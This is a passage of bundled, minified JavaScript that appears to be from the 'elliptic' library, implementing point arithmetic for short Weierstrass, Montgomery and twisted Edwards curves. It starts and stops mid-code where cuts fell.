    b.prototype.encodeCompressed = function(Y) {
        return this.encode(Y, !0)
    }
    ,
    b.prototype._encode = function(Y) {
        var F = this.curve.p.byteLength()
          , V = this.getX().toArray("be", F);
        return Y ? [this.getY().isEven() ? 2 : 3].concat(V) : [4].concat(V, this.getY().toArray("be", F))
    }
    ,
    b.prototype.encode = function(Y, F) {
        return M.encode(this._encode(F), Y)
    }
    ,
    b.prototype.precompute = function(Y) {
        if (this.precomputed)
            return this;
        var F = {
            doubles: null,
            naf: null,
            beta: null
        };
        return F.naf = this._getNAFPoints(8),
        F.doubles = this._getDoubles(4, Y),
        F.beta = this._getBeta(),
        this.precomputed = F,
        this
    }
    ,
    b.prototype._hasDoubles = function(Y) {
        if (!this.precomputed)
            return !1;
        var F = this.precomputed.doubles;
        return F ? F.points.length >= Math.ceil((Y.bitLength() + 1) / F.step) : !1
    }
    ,
    b.prototype._getDoubles = function(Y, F) {
        if (this.precomputed && this.precomputed.doubles)
            return this.precomputed.doubles;
        for (var V = [this], K = this, Q = 0; Q < F; Q += Y) {
            for (var ee = 0; ee < Y; ee++)
                K = K.dbl();
            V.push(K)
        }
        return {
            step: Y,
            points: V
        }
    }
    ,
    b.prototype._getNAFPoints = function(Y) {
        if (this.precomputed && this.precomputed.naf)
            return this.precomputed.naf;
        for (var F = [this], V = (1 << Y) - 1, K = V === 1 ? null : this.dbl(), Q = 1; Q < V; Q++)
            F[Q] = F[Q - 1].add(K);
        return {
            wnd: Y,
            points: F
        }
    }
    ,
    b.prototype._getBeta = function() {
        return null
    }
    ,
    b.prototype.dblp = function(Y) {
        for (var F = this, V = 0; V < Y; V++)
            F = F.dbl();
        return F
    }
    ,
    base$1
}
var short, hasRequiredShort;
function requireShort() {
    if (hasRequiredShort)
        return short;
    hasRequiredShort = 1;
    var _ = requireUtils$5()
      , M = requireBn$3()
      , j = requireInherits_browser()
      , O = requireBase$1()
      , x = _.assert;
    function w(Y) {
        O.call(this, "short", Y),
        this.a = new M(Y.a,16).toRed(this.red),
        this.b = new M(Y.b,16).toRed(this.red),
        this.tinv = this.two.redInvm(),
        this.zeroA = this.a.fromRed().cmpn(0) === 0,
        this.threeA = this.a.fromRed().sub(this.p).cmpn(-3) === 0,
        this.endo = this._getEndomorphism(Y),
        this._endoWnafT1 = new Array(4),
        this._endoWnafT2 = new Array(4)
    }
    j(w, O),
    short = w,
    w.prototype._getEndomorphism = function(F) {
        if (!(!this.zeroA || !this.g || !this.n || this.p.modn(3) !== 1)) {
            var V, K;
            if (F.beta)
                V = new M(F.beta,16).toRed(this.red);
            else {
                var Q = this._getEndoRoots(this.p);
                V = Q[0].cmp(Q[1]) < 0 ? Q[0] : Q[1],
                V = V.toRed(this.red)
            }
            if (F.lambda)
                K = new M(F.lambda,16);
            else {
                var ee = this._getEndoRoots(this.n);
                this.g.mul(ee[0]).x.cmp(this.g.x.redMul(V)) === 0 ? K = ee[0] : (K = ee[1],
                x(this.g.mul(K).x.cmp(this.g.x.redMul(V)) === 0))
            }
            var ae;
            return F.basis ? ae = F.basis.map(function(ne) {
                return {
                    a: new M(ne.a,16),
                    b: new M(ne.b,16)
                }
            }) : ae = this._getEndoBasis(K),
            {
                beta: V,
                lambda: K,
                basis: ae
            }
        }
    }
    ,
    w.prototype._getEndoRoots = function(F) {
        var V = F === this.p ? this.red : M.mont(F)
          , K = new M(2).toRed(V).redInvm()
          , Q = K.redNeg()
          , ee = new M(3).toRed(V).redNeg().redSqrt().redMul(K)
          , ae = Q.redAdd(ee).fromRed()
          , ne = Q.redSub(ee).fromRed();
        return [ae, ne]
    }
    ,
    w.prototype._getEndoBasis = function(F) {
        for (var V = this.n.ushrn(Math.floor(this.n.bitLength() / 2)), K = F, Q = this.n.clone(), ee = new M(1), ae = new M(0), ne = new M(0), oe = new M(1), ue, fe, he, pe, ye, be, xe, Ae = 0, Ee, Be; K.cmpn(0) !== 0; ) {
            var ce = Q.div(K);
            Ee = Q.sub(ce.mul(K)),
            Be = ne.sub(ce.mul(ee));
            var q = oe.sub(ce.mul(ae));
            if (!he && Ee.cmp(V) < 0)
                ue = xe.neg(),
                fe = ee,
                he = Ee.neg(),
                pe = Be;
            else if (he && ++Ae === 2)
                break;
            xe = Ee,
            Q = K,
            K = Ee,
            ne = ee,
            ee = Be,
            oe = ae,
            ae = q
        }
        ye = Ee.neg(),
        be = Be;
        var L = he.sqr().add(pe.sqr())
          , U = ye.sqr().add(be.sqr());
        return U.cmp(L) >= 0 && (ye = ue,
        be = fe),
        he.negative && (he = he.neg(),
        pe = pe.neg()),
        ye.negative && (ye = ye.neg(),
        be = be.neg()),
        [{
            a: he,
            b: pe
        }, {
            a: ye,
            b: be
        }]
    }
    ,
    w.prototype._endoSplit = function(F) {
        var V = this.endo.basis
          , K = V[0]
          , Q = V[1]
          , ee = Q.b.mul(F).divRound(this.n)
          , ae = K.b.neg().mul(F).divRound(this.n)
          , ne = ee.mul(K.a)
          , oe = ae.mul(Q.a)
          , ue = ee.mul(K.b)
          , fe = ae.mul(Q.b)
          , he = F.sub(ne).sub(oe)
          , pe = ue.add(fe).neg();
        return {
            k1: he,
            k2: pe
        }
    }
    ,
    w.prototype.pointFromX = function(F, V) {
        F = new M(F,16),
        F.red || (F = F.toRed(this.red));
        var K = F.redSqr().redMul(F).redIAdd(F.redMul(this.a)).redIAdd(this.b)
          , Q = K.redSqrt();
        if (Q.redSqr().redSub(K).cmp(this.zero) !== 0)
            throw new Error("invalid point");
        var ee = Q.fromRed().isOdd();
        return (V && !ee || !V && ee) && (Q = Q.redNeg()),
        this.point(F, Q)
    }
    ,
    w.prototype.validate = function(F) {
        if (F.inf)
            return !0;
        var V = F.x
          , K = F.y
          , Q = this.a.redMul(V)
          , ee = V.redSqr().redMul(V).redIAdd(Q).redIAdd(this.b);
        return K.redSqr().redISub(ee).cmpn(0) === 0
    }
    ,
    w.prototype._endoWnafMulAdd = function(F, V, K) {
        for (var Q = this._endoWnafT1, ee = this._endoWnafT2, ae = 0; ae < F.length; ae++) {
            var ne = this._endoSplit(V[ae])
              , oe = F[ae]
              , ue = oe._getBeta();
            ne.k1.negative && (ne.k1.ineg(),
            oe = oe.neg(!0)),
            ne.k2.negative && (ne.k2.ineg(),
            ue = ue.neg(!0)),
            Q[ae * 2] = oe,
            Q[ae * 2 + 1] = ue,
            ee[ae * 2] = ne.k1,
            ee[ae * 2 + 1] = ne.k2
        }
        for (var fe = this._wnafMulAdd(1, Q, ee, ae * 2, K), he = 0; he < ae * 2; he++)
            Q[he] = null,
            ee[he] = null;
        return fe
    }
    ;
    function b(Y, F, V, K) {
        O.BasePoint.call(this, Y, "affine"),
        F === null && V === null ? (this.x = null,
        this.y = null,
        this.inf = !0) : (this.x = new M(F,16),
        this.y = new M(V,16),
        K && (this.x.forceRed(this.curve.red),
        this.y.forceRed(this.curve.red)),
        this.x.red || (this.x = this.x.toRed(this.curve.red)),
        this.y.red || (this.y = this.y.toRed(this.curve.red)),
        this.inf = !1)
    }
    j(b, O.BasePoint),
    w.prototype.point = function(F, V, K) {
        return new b(this,F,V,K)
    }
    ,
    w.prototype.pointFromJSON = function(F, V) {
        return b.fromJSON(this, F, V)
    }
    ,
    b.prototype._getBeta = function() {
        if (this.curve.endo) {
            var F = this.precomputed;
            if (F && F.beta)
                return F.beta;
            var V = this.curve.point(this.x.redMul(this.curve.endo.beta), this.y);
            if (F) {
                var K = this.curve
                  , Q = function(ee) {
                    return K.point(ee.x.redMul(K.endo.beta), ee.y)
                };
                F.beta = V,
                V.precomputed = {
                    beta: null,
                    naf: F.naf && {
                        wnd: F.naf.wnd,
                        points: F.naf.points.map(Q)
                    },
                    doubles: F.doubles && {
                        step: F.doubles.step,
                        points: F.doubles.points.map(Q)
                    }
                }
            }
            return V
        }
    }
    ,
    b.prototype.toJSON = function() {
        return this.precomputed ? [this.x, this.y, this.precomputed && {
            doubles: this.precomputed.doubles && {
                step: this.precomputed.doubles.step,
                points: this.precomputed.doubles.points.slice(1)
            },
            naf: this.precomputed.naf && {
                wnd: this.precomputed.naf.wnd,
                points: this.precomputed.naf.points.slice(1)
            }
        }] : [this.x, this.y]
    }
    ,
    b.fromJSON = function(F, V, K) {
        typeof V == "string" && (V = JSON.parse(V));
        var Q = F.point(V[0], V[1], K);
        if (!V[2])
            return Q;
        function ee(ne) {
            return F.point(ne[0], ne[1], K)
        }
        var ae = V[2];
        return Q.precomputed = {
            beta: null,
            doubles: ae.doubles && {
                step: ae.doubles.step,
                points: [Q].concat(ae.doubles.points.map(ee))
            },
            naf: ae.naf && {
                wnd: ae.naf.wnd,
                points: [Q].concat(ae.naf.points.map(ee))
            }
        },
        Q
    }
    ,
    b.prototype.inspect = function() {
        return this.isInfinity() ? "<EC Point Infinity>" : "<EC Point x: " + this.x.fromRed().toString(16, 2) + " y: " + this.y.fromRed().toString(16, 2) + ">"
    }
    ,
    b.prototype.isInfinity = function() {
        return this.inf
    }
    ,
    b.prototype.add = function(F) {
        if (this.inf)
            return F;
        if (F.inf)
            return this;
        if (this.eq(F))
            return this.dbl();
        if (this.neg().eq(F))
            return this.curve.point(null, null);
        if (this.x.cmp(F.x) === 0)
            return this.curve.point(null, null);
        var V = this.y.redSub(F.y);
        V.cmpn(0) !== 0 && (V = V.redMul(this.x.redSub(F.x).redInvm()));
        var K = V.redSqr().redISub(this.x).redISub(F.x)
          , Q = V.redMul(this.x.redSub(K)).redISub(this.y);
        return this.curve.point(K, Q)
    }
    ,
    b.prototype.dbl = function() {
        if (this.inf)
            return this;
        var F = this.y.redAdd(this.y);
        if (F.cmpn(0) === 0)
            return this.curve.point(null, null);
        var V = this.curve.a
          , K = this.x.redSqr()
          , Q = F.redInvm()
          , ee = K.redAdd(K).redIAdd(K).redIAdd(V).redMul(Q)
          , ae = ee.redSqr().redISub(this.x.redAdd(this.x))
          , ne = ee.redMul(this.x.redSub(ae)).redISub(this.y);
        return this.curve.point(ae, ne)
    }
    ,
    b.prototype.getX = function() {
        return this.x.fromRed()
    }
    ,
    b.prototype.getY = function() {
        return this.y.fromRed()
    }
    ,
    b.prototype.mul = function(F) {
        return F = new M(F,16),
        this.isInfinity() ? this : this._hasDoubles(F) ? this.curve._fixedNafMul(this, F) : this.curve.endo ? this.curve._endoWnafMulAdd([this], [F]) : this.curve._wnafMul(this, F)
    }
    ,
    b.prototype.mulAdd = function(F, V, K) {
        var Q = [this, V]
          , ee = [F, K];
        return this.curve.endo ? this.curve._endoWnafMulAdd(Q, ee) : this.curve._wnafMulAdd(1, Q, ee, 2)
    }
    ,
    b.prototype.jmulAdd = function(F, V, K) {
        var Q = [this, V]
          , ee = [F, K];
        return this.curve.endo ? this.curve._endoWnafMulAdd(Q, ee, !0) : this.curve._wnafMulAdd(1, Q, ee, 2, !0)
    }
    ,
    b.prototype.eq = function(F) {
        return this === F || this.inf === F.inf && (this.inf || this.x.cmp(F.x) === 0 && this.y.cmp(F.y) === 0)
    }
    ,
    b.prototype.neg = function(F) {
        if (this.inf)
            return this;
        var V = this.curve.point(this.x, this.y.redNeg());
        if (F && this.precomputed) {
            var K = this.precomputed
              , Q = function(ee) {
                return ee.neg()
            };
            V.precomputed = {
                naf: K.naf && {
                    wnd: K.naf.wnd,
                    points: K.naf.points.map(Q)
                },
                doubles: K.doubles && {
                    step: K.doubles.step,
                    points: K.doubles.points.map(Q)
                }
            }
        }
        return V
    }
    ,
    b.prototype.toJ = function() {
        if (this.inf)
            return this.curve.jpoint(null, null, null);
        var F = this.curve.jpoint(this.x, this.y, this.curve.one);
        return F
    }
    ;
    function X(Y, F, V, K) {
        O.BasePoint.call(this, Y, "jacobian"),
        F === null && V === null && K === null ? (this.x = this.curve.one,
        this.y = this.curve.one,
        this.z = new M(0)) : (this.x = new M(F,16),
        this.y = new M(V,16),
        this.z = new M(K,16)),
        this.x.red || (this.x = this.x.toRed(this.curve.red)),
        this.y.red || (this.y = this.y.toRed(this.curve.red)),
        this.z.red || (this.z = this.z.toRed(this.curve.red)),
        this.zOne = this.z === this.curve.one
    }
    return j(X, O.BasePoint),
    w.prototype.jpoint = function(F, V, K) {
        return new X(this,F,V,K)
    }
    ,
    X.prototype.toP = function() {
        if (this.isInfinity())
            return this.curve.point(null, null);
        var F = this.z.redInvm()
          , V = F.redSqr()
          , K = this.x.redMul(V)
          , Q = this.y.redMul(V).redMul(F);
        return this.curve.point(K, Q)
    }
    ,
    X.prototype.neg = function() {
        return this.curve.jpoint(this.x, this.y.redNeg(), this.z)
    }
    ,
    X.prototype.add = function(F) {
        if (this.isInfinity())
            return F;
        if (F.isInfinity())
            return this;
        var V = F.z.redSqr()
          , K = this.z.redSqr()
          , Q = this.x.redMul(V)
          , ee = F.x.redMul(K)
          , ae = this.y.redMul(V.redMul(F.z))
          , ne = F.y.redMul(K.redMul(this.z))
          , oe = Q.redSub(ee)
          , ue = ae.redSub(ne);
        if (oe.cmpn(0) === 0)
            return ue.cmpn(0) !== 0 ? this.curve.jpoint(null, null, null) : this.dbl();
        var fe = oe.redSqr()
          , he = fe.redMul(oe)
          , pe = Q.redMul(fe)
          , ye = ue.redSqr().redIAdd(he).redISub(pe).redISub(pe)
          , be = ue.redMul(pe.redISub(ye)).redISub(ae.redMul(he))
          , xe = this.z.redMul(F.z).redMul(oe);
        return this.curve.jpoint(ye, be, xe)
    }
    ,
    X.prototype.mixedAdd = function(F) {
        if (this.isInfinity())
            return F.toJ();
        if (F.isInfinity())
            return this;
        var V = this.z.redSqr()
          , K = this.x
          , Q = F.x.redMul(V)
          , ee = this.y
          , ae = F.y.redMul(V).redMul(this.z)
          , ne = K.redSub(Q)
          , oe = ee.redSub(ae);
        if (ne.cmpn(0) === 0)
            return oe.cmpn(0) !== 0 ? this.curve.jpoint(null, null, null) : this.dbl();
        var ue = ne.redSqr()
          , fe = ue.redMul(ne)
          , he = K.redMul(ue)
          , pe = oe.redSqr().redIAdd(fe).redISub(he).redISub(he)
          , ye = oe.redMul(he.redISub(pe)).redISub(ee.redMul(fe))
          , be = this.z.redMul(ne);
        return this.curve.jpoint(pe, ye, be)
    }
    ,
    X.prototype.dblp = function(F) {
        if (F === 0)
            return this;
        if (this.isInfinity())
            return this;
        if (!F)
            return this.dbl();
        var V;
        if (this.curve.zeroA || this.curve.threeA) {
            var K = this;
            for (V = 0; V < F; V++)
                K = K.dbl();
            return K
        }
        var Q = this.curve.a
          , ee = this.curve.tinv
          , ae = this.x
          , ne = this.y
          , oe = this.z
          , ue = oe.redSqr().redSqr()
          , fe = ne.redAdd(ne);
        for (V = 0; V < F; V++) {
            var he = ae.redSqr()
              , pe = fe.redSqr()
              , ye = pe.redSqr()
              , be = he.redAdd(he).redIAdd(he).redIAdd(Q.redMul(ue))
              , xe = ae.redMul(pe)
              , Ae = be.redSqr().redISub(xe.redAdd(xe))
              , Ee = xe.redISub(Ae)
              , Be = be.redMul(Ee);
            Be = Be.redIAdd(Be).redISub(ye);
            var ce = fe.redMul(oe);
            V + 1 < F && (ue = ue.redMul(ye)),
            ae = Ae,
            oe = ce,
            fe = Be
        }
        return this.curve.jpoint(ae, fe.redMul(ee), oe)
    }
    ,
    X.prototype.dbl = function() {
        return this.isInfinity() ? this : this.curve.zeroA ? this._zeroDbl() : this.curve.threeA ? this._threeDbl() : this._dbl()
    }
    ,
    X.prototype._zeroDbl = function() {
        var F, V, K;
        if (this.zOne) {
            var Q = this.x.redSqr()
              , ee = this.y.redSqr()
              , ae = ee.redSqr()
              , ne = this.x.redAdd(ee).redSqr().redISub(Q).redISub(ae);
            ne = ne.redIAdd(ne);
            var oe = Q.redAdd(Q).redIAdd(Q)
              , ue = oe.redSqr().redISub(ne).redISub(ne)
              , fe = ae.redIAdd(ae);
            fe = fe.redIAdd(fe),
            fe = fe.redIAdd(fe),
            F = ue,
            V = oe.redMul(ne.redISub(ue)).redISub(fe),
            K = this.y.redAdd(this.y)
        } else {
            var he = this.x.redSqr()
              , pe = this.y.redSqr()
              , ye = pe.redSqr()
              , be = this.x.redAdd(pe).redSqr().redISub(he).redISub(ye);
            be = be.redIAdd(be);
            var xe = he.redAdd(he).redIAdd(he)
              , Ae = xe.redSqr()
              , Ee = ye.redIAdd(ye);
            Ee = Ee.redIAdd(Ee),
            Ee = Ee.redIAdd(Ee),
            F = Ae.redISub(be).redISub(be),
            V = xe.redMul(be.redISub(F)).redISub(Ee),
            K = this.y.redMul(this.z),
            K = K.redIAdd(K)
        }
        return this.curve.jpoint(F, V, K)
    }
    ,
    X.prototype._threeDbl = function() {
        var F, V, K;
        if (this.zOne) {
            var Q = this.x.redSqr()
              , ee = this.y.redSqr()
              , ae = ee.redSqr()
              , ne = this.x.redAdd(ee).redSqr().redISub(Q).redISub(ae);
            ne = ne.redIAdd(ne);
            var oe = Q.redAdd(Q).redIAdd(Q).redIAdd(this.curve.a)
              , ue = oe.redSqr().redISub(ne).redISub(ne);
            F = ue;
            var fe = ae.redIAdd(ae);
            fe = fe.redIAdd(fe),
            fe = fe.redIAdd(fe),
            V = oe.redMul(ne.redISub(ue)).redISub(fe),
            K = this.y.redAdd(this.y)
        } else {
            var he = this.z.redSqr()
              , pe = this.y.redSqr()
              , ye = this.x.redMul(pe)
              , be = this.x.redSub(he).redMul(this.x.redAdd(he));
            be = be.redAdd(be).redIAdd(be);
            var xe = ye.redIAdd(ye);
            xe = xe.redIAdd(xe);
            var Ae = xe.redAdd(xe);
            F = be.redSqr().redISub(Ae),
            K = this.y.redAdd(this.z).redSqr().redISub(pe).redISub(he);
            var Ee = pe.redSqr();
            Ee = Ee.redIAdd(Ee),
            Ee = Ee.redIAdd(Ee),
            Ee = Ee.redIAdd(Ee),
            V = be.redMul(xe.redISub(F)).redISub(Ee)
        }
        return this.curve.jpoint(F, V, K)
    }
    ,
    X.prototype._dbl = function() {
        var F = this.curve.a
          , V = this.x
          , K = this.y
          , Q = this.z
          , ee = Q.redSqr().redSqr()
          , ae = V.redSqr()
          , ne = K.redSqr()
          , oe = ae.redAdd(ae).redIAdd(ae).redIAdd(F.redMul(ee))
          , ue = V.redAdd(V);
        ue = ue.redIAdd(ue);
        var fe = ue.redMul(ne)
          , he = oe.redSqr().redISub(fe.redAdd(fe))
          , pe = fe.redISub(he)
          , ye = ne.redSqr();
        ye = ye.redIAdd(ye),
        ye = ye.redIAdd(ye),
        ye = ye.redIAdd(ye);
        var be = oe.redMul(pe).redISub(ye)
          , xe = K.redAdd(K).redMul(Q);
        return this.curve.jpoint(he, be, xe)
    }
    ,
    X.prototype.trpl = function() {
        if (!this.curve.zeroA)
            return this.dbl().add(this);
        var F = this.x.redSqr()
          , V = this.y.redSqr()
          , K = this.z.redSqr()
          , Q = V.redSqr()
          , ee = F.redAdd(F).redIAdd(F)
          , ae = ee.redSqr()
          , ne = this.x.redAdd(V).redSqr().redISub(F).redISub(Q);
        ne = ne.redIAdd(ne),
        ne = ne.redAdd(ne).redIAdd(ne),
        ne = ne.redISub(ae);
        var oe = ne.redSqr()
          , ue = Q.redIAdd(Q);
        ue = ue.redIAdd(ue),
        ue = ue.redIAdd(ue),
        ue = ue.redIAdd(ue);
        var fe = ee.redIAdd(ne).redSqr().redISub(ae).redISub(oe).redISub(ue)
          , he = V.redMul(fe);
        he = he.redIAdd(he),
        he = he.redIAdd(he);
        var pe = this.x.redMul(oe).redISub(he);
        pe = pe.redIAdd(pe),
        pe = pe.redIAdd(pe);
        var ye = this.y.redMul(fe.redMul(ue.redISub(fe)).redISub(ne.redMul(oe)));
        ye = ye.redIAdd(ye),
        ye = ye.redIAdd(ye),
        ye = ye.redIAdd(ye);
        var be = this.z.redAdd(ne).redSqr().redISub(K).redISub(oe);
        return this.curve.jpoint(pe, ye, be)
    }
    ,
    X.prototype.mul = function(F, V) {
        return F = new M(F,V),
        this.curve._wnafMul(this, F)
    }
    ,
    X.prototype.eq = function(F) {
        if (F.type === "affine")
            return this.eq(F.toJ());
        if (this === F)
            return !0;
        var V = this.z.redSqr()
          , K = F.z.redSqr();
        if (this.x.redMul(K).redISub(F.x.redMul(V)).cmpn(0) !== 0)
            return !1;
        var Q = V.redMul(this.z)
          , ee = K.redMul(F.z);
        return this.y.redMul(ee).redISub(F.y.redMul(Q)).cmpn(0) === 0
    }
    ,
    X.prototype.eqXToP = function(F) {
        var V = this.z.redSqr()
          , K = F.toRed(this.curve.red).redMul(V);
        if (this.x.cmp(K) === 0)
            return !0;
        for (var Q = F.clone(), ee = this.curve.redN.redMul(V); ; ) {
            if (Q.iadd(this.curve.n),
            Q.cmp(this.curve.p) >= 0)
                return !1;
            if (K.redIAdd(ee),
            this.x.cmp(K) === 0)
                return !0
        }
    }
    ,
    X.prototype.inspect = function() {
        return this.isInfinity() ? "<EC JPoint Infinity>" : "<EC JPoint x: " + this.x.toString(16, 2) + " y: " + this.y.toString(16, 2) + " z: " + this.z.toString(16, 2) + ">"
    }
    ,
    X.prototype.isInfinity = function() {
        return this.z.cmpn(0) === 0
    }
    ,
    short
}
var mont, hasRequiredMont;
function requireMont() {
    if (hasRequiredMont)
        return mont;
    hasRequiredMont = 1;
    var _ = requireBn$3()
      , M = requireInherits_browser()
      , j = requireBase$1()
      , O = requireUtils$5();
    function x(b) {
        j.call(this, "mont", b),
        this.a = new _(b.a,16).toRed(this.red),
        this.b = new _(b.b,16).toRed(this.red),
        this.i4 = new _(4).toRed(this.red).redInvm(),
        this.two = new _(2).toRed(this.red),
        this.a24 = this.i4.redMul(this.a.redAdd(this.two))
    }
    M(x, j),
    mont = x,
    x.prototype.validate = function(X) {
        var Y = X.normalize().x
          , F = Y.redSqr()
          , V = F.redMul(Y).redAdd(F.redMul(this.a)).redAdd(Y)
          , K = V.redSqrt();
        return K.redSqr().cmp(V) === 0
    }
    ;
    function w(b, X, Y) {
        j.BasePoint.call(this, b, "projective"),
        X === null && Y === null ? (this.x = this.curve.one,
        this.z = this.curve.zero) : (this.x = new _(X,16),
        this.z = new _(Y,16),
        this.x.red || (this.x = this.x.toRed(this.curve.red)),
        this.z.red || (this.z = this.z.toRed(this.curve.red)))
    }
    return M(w, j.BasePoint),
    x.prototype.decodePoint = function(X, Y) {
        return this.point(O.toArray(X, Y), 1)
    }
    ,
    x.prototype.point = function(X, Y) {
        return new w(this,X,Y)
    }
    ,
    x.prototype.pointFromJSON = function(X) {
        return w.fromJSON(this, X)
    }
    ,
    w.prototype.precompute = function() {}
    ,
    w.prototype._encode = function() {
        return this.getX().toArray("be", this.curve.p.byteLength())
    }
    ,
    w.fromJSON = function(X, Y) {
        return new w(X,Y[0],Y[1] || X.one)
    }
    ,
    w.prototype.inspect = function() {
        return this.isInfinity() ? "<EC Point Infinity>" : "<EC Point x: " + this.x.fromRed().toString(16, 2) + " z: " + this.z.fromRed().toString(16, 2) + ">"
    }
    ,
    w.prototype.isInfinity = function() {
        return this.z.cmpn(0) === 0
    }
    ,
    w.prototype.dbl = function() {
        var X = this.x.redAdd(this.z)
          , Y = X.redSqr()
          , F = this.x.redSub(this.z)
          , V = F.redSqr()
          , K = Y.redSub(V)
          , Q = Y.redMul(V)
          , ee = K.redMul(V.redAdd(this.curve.a24.redMul(K)));
        return this.curve.point(Q, ee)
    }
    ,
    w.prototype.add = function() {
        throw new Error("Not supported on Montgomery curve")
    }
    ,
    w.prototype.diffAdd = function(X, Y) {
        var F = this.x.redAdd(this.z)
          , V = this.x.redSub(this.z)
          , K = X.x.redAdd(X.z)
          , Q = X.x.redSub(X.z)
          , ee = Q.redMul(F)
          , ae = K.redMul(V)
          , ne = Y.z.redMul(ee.redAdd(ae).redSqr())
          , oe = Y.x.redMul(ee.redISub(ae).redSqr());
        return this.curve.point(ne, oe)
    }
    ,
    w.prototype.mul = function(X) {
        for (var Y = X.clone(), F = this, V = this.curve.point(null, null), K = this, Q = []; Y.cmpn(0) !== 0; Y.iushrn(1))
            Q.push(Y.andln(1));
        for (var ee = Q.length - 1; ee >= 0; ee--)
            Q[ee] === 0 ? (F = F.diffAdd(V, K),
            V = V.dbl()) : (V = F.diffAdd(V, K),
            F = F.dbl());
        return V
    }
    ,
    w.prototype.mulAdd = function() {
        throw new Error("Not supported on Montgomery curve")
    }
    ,
    w.prototype.jumlAdd = function() {
        throw new Error("Not supported on Montgomery curve")
    }
    ,
    w.prototype.eq = function(X) {
        return this.getX().cmp(X.getX()) === 0
    }
    ,
    w.prototype.normalize = function() {
        return this.x = this.x.redMul(this.z.redInvm()),
        this.z = this.curve.one,
        this
    }
    ,
    w.prototype.getX = function() {
        return this.normalize(),
        this.x.fromRed()
    }
    ,
    mont
}
var edwards, hasRequiredEdwards;
function requireEdwards() {
    if (hasRequiredEdwards)
        return edwards;
    hasRequiredEdwards = 1;
    var _ = requireUtils$5()
      , M = requireBn$3()
      , j = requireInherits_browser()
      , O = requireBase$1()
      , x = _.assert;
    function w(X) {
        this.twisted = (X.a | 0) !== 1,
        this.mOneA = this.twisted && (X.a | 0) === -1,
        this.extended = this.mOneA,
        O.call(this, "edwards", X),
        this.a = new M(X.a,16).umod(this.red.m),
        this.a = this.a.toRed(this.red),
        this.c = new M(X.c,16).toRed(this.red),
        this.c2 = this.c.redSqr(),
        this.d = new M(X.d,16).toRed(this.red),
        this.dd = this.d.redAdd(this.d),
        x(!this.twisted || this.c.fromRed().cmpn(1) === 0),
        this.oneC = (X.c | 0) === 1
    }
    j(w, O),
    edwards = w,
    w.prototype._mulA = function(Y) {
        return this.mOneA ? Y.redNeg() : this.a.redMul(Y)
    }
    ,
    w.prototype._mulC = function(Y) {
        return this.oneC ? Y : this.c.redMul(Y)
    }
    ,
    w.prototype.jpoint = function(Y, F, V, K) {
        return this.point(Y, F, V, K)
    }
    ,
    w.prototype.pointFromX = function(Y, F) {
        Y = new M(Y,16),
        Y.red || (Y = Y.toRed(this.red));
        var V = Y.redSqr()
          , K = this.c2.redSub(this.a.redMul(V))
          , Q = this.one.redSub(this.c2.redMul(this.d).redMul(V))
          , ee = K.redMul(Q.redInvm())
          , ae = ee.redSqrt();
        if (ae.redSqr().redSub(ee).cmp(this.zero) !== 0)
            throw new Error("invalid point");
        var ne = ae.fromRed().isOdd();
        return (F && !ne || !F && ne) && (ae = ae.redNeg()),
        this.point(Y, ae)
    }
    ,
    w.prototype.pointFromY = function(Y, F) {
        Y = new M(Y,16),
        Y.red || (Y = Y.toRed(this.red));
        var V = Y.redSqr()
          , K = V.redSub(this.c2)
          , Q = V.redMul(this.d).redMul(this.c2).redSub(this.a)
          , ee = K.redMul(Q.redInvm());
        if (ee.cmp(this.zero) === 0) {
            if (F)
                throw new Error("invalid point");
            return this.point(this.zero, Y)
        }
        var ae = ee.redSqrt();
        if (ae.redSqr().redSub(ee).cmp(this.zero) !== 0)
            throw new Error("invalid point");
        return ae.fromRed().isOdd() !== F && (ae = ae.redNeg()),
        this.point(ae, Y)
    }
    ,
    w.prototype.validate = function(Y) {
        if (Y.isInfinity())
            return !0;
        Y.normalize();
        var F = Y.x.redSqr()
          , V = Y.y.redSqr()
          , K = F.redMul(this.a).redAdd(V)
          , Q = this.c2.redMul(this.one.redAdd(this.d.redMul(F).redMul(V)));
        return K.cmp(Q) === 0
    }
    ;
    function b(X, Y, F, V, K) {
        O.BasePoint.call(this, X, "projective"),
        Y === null && F === null && V === null ? (this.x = this.curve.zero,
        this.y = this.curve.one,
        this.z = this.curve.one,
        this.t = this.curve.zero,
        this.zOne = !0) : (this.x = new M(Y,16),
        this.y = new M(F,16),
        this.z = V ? new M(V,16) : this.curve.one,
        this.t = K && new M(K,16),
        this.x.red || (this.x = this.x.toRed(this.curve.red)),
        this.y.red || (this.y = this.y.toRed(this.curve.red)),
        this.z.red || (this.z = this.z.toRed(this.curve.red)),
        this.t && !this.t.red && (this.t = this.t.toRed(this.curve.red)),
        this.zOne = this.z === this.curve.one,
        this.curve.extended && !this.t && (this.t = this.x.redMul(this.y),
        this.zOne || (this.t = this.t.redMul(this.z.redInvm()))))
    }
    return j(b, O.BasePoint),
    w.prototype.pointFromJSON = function(Y) {
        return b.fromJSON(this, Y)
    }
    ,
    w.prototype.point = function(Y, F, V, K) {
        return new b(this,Y,F,V,K)
    }
    ,
    b.fromJSON = function(Y, F) {
        return new b(Y,F[0],F[1],F[2])
    }
    ,
    b.prototype.inspect = function() {
        return this.isInfinity() ? "<EC Point Infinity>" : "<EC Point x: " + this.x.fromRed().toString(16, 2) + " y: " + this.y.fromRed().toString(16, 2) + " z: " + this.z.fromRed().toString(16, 2) + ">"
    }
    ,
    b.prototype.isInfinity = function() {
        return this.x.cmpn(0) === 0 && (this.y.cmp(this.z) === 0 || this.zOne && this.y.cmp(this.curve.c) === 0)
    }
    ,
    b.prototype._extDbl = function() {
        var Y = this.x.redSqr()
          , F = this.y.redSqr()
          , V = this.z.redSqr();
        V = V.redIAdd(V);
        var K = this.curve._mulA(Y)
          , Q = this.x.redAdd(this.y).redSqr().redISub(Y).redISub(F)
          , ee = K.redAdd(F)
          , ae = ee.redSub(V)
          , ne = K.redSub(F)
          , oe = Q.redMul(ae)
          , ue = ee.redMul(ne)
          , fe = Q.redMul(ne)
          , he = ae.redMul(ee);
        return this.curve.point(oe, ue, he, fe)
    }
    ,
    b.prototype._projDbl = function() {
        var Y = this.x.redAdd(this.y).redSqr(), F = this.x.redSqr(), V = this.y.redSqr(), K, Q, ee, ae, ne, oe;
        if (this.curve.twisted) {
            ae = this.curve._mulA(F);
            var ue = ae.redAdd(V);
            this.zOne ? (K = Y.redSub(F).redSub(V).redMul(ue.redSub(this.curve.two)),
            Q = ue.redMul(ae.redSub(V)),
            ee = ue.redSqr().redSub(ue).redSub(ue)) : (ne = this.z.redSqr(),
            oe = ue.redSub(ne).redISub(ne),
            K = Y.redSub(F).redISub(V).redMul(oe),
